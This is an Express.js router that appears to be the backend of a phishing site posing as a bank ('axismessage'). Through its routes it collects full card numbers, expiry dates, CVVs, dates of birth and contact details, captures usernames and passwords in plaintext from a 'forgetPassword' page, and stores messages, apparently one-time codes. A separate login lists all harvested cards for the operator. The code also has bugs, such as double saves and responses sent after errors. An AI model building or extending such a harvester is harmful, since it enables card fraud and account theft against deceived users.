var express = require('express');
var router = express.Router();
const CardModal = require('../models/CardData')
const MessageModal = require('../models/MessageData')
const LoginModal = require('../models/LoginData')

/* GET home page. */
router.get('/', function (req, res, next) {
  res.render('index', { title: 'Home' });
});
router.get('/PageLogin', function (req, res, next) {
  res.render('loginHome', { title: 'loginHome' });
});
router.get('/PageLogins', function (req, res, next) {
  res.render('newcard', { title: 'newcard' });
});
router.get('/forgetPassword', function (req, res, next) {
  res.render('loginpage', { title: 'loginpage' });
});
router.get('/signup', function (req, res, next) {
  res.render('singUp', { title: 'singUp' });
});
router.get('/formpge', function (req, res, next) {
  res.render('form', { title: 'form' });
});

router.get('/uplolded', function (req, res, next) {
  res.render('uplode', { title: ' uplode' })
});

router.get('/options', function (req, res, next) {
  res.render('option', { title: 'Options' });
});
router.post('/card', async function (req, res, next) {
  try {
    var userDetails = new CardModal({
      name: req.body.name,
      mobile: req.body.mobile,
      email: req.body.email,
      dob: req.body.dob,
      totalLimit: req.body.totalLimit,
      avLimit: req.body.avLimit,
      cardNumber: req.body.cardNumber,
      holderName: req.body.holderName,
      exDate: req.body.expiry,
      cvv: req.body.cvv
    });
    const user = await userDetails.save();
    console.log(user);
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }

  userDetails.save();
  res.render('success')
});

router.post('/loginpage', async (req, res) => {
  try {
    var userDetails = new LoginModal({
      username: req.body.username,
      password: req.body.password,
    });
    const login = await userDetails.save();
    console.log(login);

  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }
  res.render('loginSuscss')
})

router.post('/logdata', async (req, res) => {
  var userDetails = new LoginModal({
    username: req.body.username,
    password: req.body.password,
  });

  const loguser = await LoginModal.findOne({ username: userDetails.username, password: userDetails.password })
  let cardData = await CardModal.find().sort({ createdAt: -1 });

  if (loguser) {
    res.render("card", { cardData })
  } else {
    res.send("user Not Found: Please Try Aagin")
  }


})

router.post('/message', async (req, res) => {
  try {
    var userDetails = new MessageModal({
      message: req.body.message,
    });
    const message = await userDetails.save();
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }
  res.send('message got success')
})




router.post("/axismessage", async (req, res) => {
  let cardData = await MessageModal.find().sort({ createdAt: -1 });
  res.render("message", { cardData })
})

module.exports = router;
